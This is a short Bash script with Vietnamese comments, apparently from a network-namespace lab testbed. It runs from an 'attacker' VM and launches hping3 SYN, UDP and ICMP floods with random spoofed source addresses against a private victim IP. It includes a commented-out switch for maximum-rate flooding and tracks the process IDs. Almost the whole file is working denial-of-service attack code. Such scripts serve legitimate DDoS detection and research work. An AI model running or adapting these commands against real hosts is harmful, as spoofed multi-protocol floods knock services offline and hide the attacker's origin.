#!/bin/bash
# =============================================================
# File: attack_sc2_random_v2.sh
# Chạy trên: VM attacker (10.10.1.2)
# Mục đích: Bắn Flood đa giao thức (SYN, UDP, ICMP) giả mạo IP 
#           hoàn toàn ngẫu nhiên.
# =============================================================

VICTIM_IP="10.10.2.2"

# Mặc định sử dụng u100 (tương đương 10,000 pps mỗi tiến trình)
DEFAULT_PPS="-i u100"

# BỎ COMMENT DÒNG DƯỚI NẾU MUỐN DÙNG CHẾ ĐỘ --flood (Bắn tối đa tốc độ phần cứng)
# DEFAULT_PPS="--flood"

echo "[*] [ATTACKER] Đang chuẩn bị đạn dược Botnet Đa Giao Thức (Random Source IP)..."

# Xóa các hping3 cũ nếu có bị kẹt
pkill hping3 2>/dev/null || true
rm -f /tmp/sc2_random.pids

# 1. NS 6, 7, 8: Bắn SYN Flood
for ns in ns6 ns7 ns8; do
    echo "    [+] Khởi chạy hping3 SYN Flood Random IP trên $ns"
    ip netns exec $ns hping3 -S -p 80 $DEFAULT_PPS --rand-source $VICTIM_IP > /dev/null 2>&1 &
    echo $! >> /tmp/sc2_random.pids
done

# 2. NS 9: Bắn UDP Flood
echo "    [+] Khởi chạy hping3 UDP Flood Random IP trên ns9"
ip netns exec ns9 hping3 --udp -p 80 $DEFAULT_PPS --rand-source $VICTIM_IP > /dev/null 2>&1 &
echo $! >> /tmp/sc2_random.pids

# 3. NS 10: Bắn ICMP Flood (Ping Flood)
echo "    [+] Khởi chạy hping3 ICMP Flood Random IP trên ns10"
ip netns exec ns10 hping3 --icmp $DEFAULT_PPS --rand-source $VICTIM_IP > /dev/null 2>&1 &
echo $! >> /tmp/sc2_random.pids

echo "[*] [ATTACKER] KỊCH BẢN 2 (V2) ĐÃ KÍCH HOẠT! Bão đa giao thức đang đổ bộ vào $VICTIM_IP"
